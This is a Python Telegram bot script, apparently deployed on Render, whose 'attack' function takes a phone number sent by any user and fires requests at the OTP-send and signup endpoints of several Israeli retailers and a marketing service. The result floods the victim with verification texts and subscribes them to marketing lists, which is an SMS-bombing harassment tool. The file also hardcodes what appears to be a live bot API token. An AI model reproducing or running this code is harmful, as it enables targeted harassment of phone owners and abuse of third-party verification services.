import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

# --- חלק 1: שרת Flask עבור Render ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Running"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- חלק 2: הגדרת הבוט ---
API_TOKEN = '8788411826:AAEQdmRx50VFB91zjRJrEaMJFghDp8Tayg0'
bot = telebot.TeleBot(API_TOKEN)

def attack(target):
    # רשימת ה-APIs עם תיקון פסיקים וסוגרים
    apis = [
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Terminal X", "u": "https://www.terminalx.com/api/v1/auth/otp/send", "d": {"phone": target}},
        {"n": "Golf", "u": "https://www.golf-il.co.il/customer/ajax/post/", "d": {"form_key": "WaqdnLcdTj3jsiZw", "bot_validation": "1", "type": "login", "telephone": target}},
        {
            "n": "Flashy",
            "u": "https://api.flashy.app/thunder/contact?overwrite=true&primary_key=email",
            "d": {
                "email": f"user_{target}@gmail.com",
                "phone": target,
                "signup_source": "welcome",
                "lists": {"15304": True}
            }
        }
    ]
    
    headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"}
    
    for site in apis:
        try:
            if site["n"] == "Golf":
                requests.post(site["u"], data=site["d"], headers=headers, timeout=5)
            else:
                requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
        except: pass
        time.sleep(1)

@bot.message_handler(func=lambda m: True)
def handle(m):
    target = m.text.strip()
    if target.isdigit() and len(target) >= 9:
        bot.reply_to(m, f"🚀 מתחיל עבודה על {target}...")
        attack(target) # מריץ סבב אחד
        bot.send_message(m.chat.id, "✅ הסתיים.")
    else:
        bot.reply_to(m, "שלח מספר טלפון תקין.")

if __name__ == "__main__":
    keep_alive() # מפעיל את השרת ש-Render מחפש
    print("--- BOT STARTED ---")
    bot.infinity_polling()
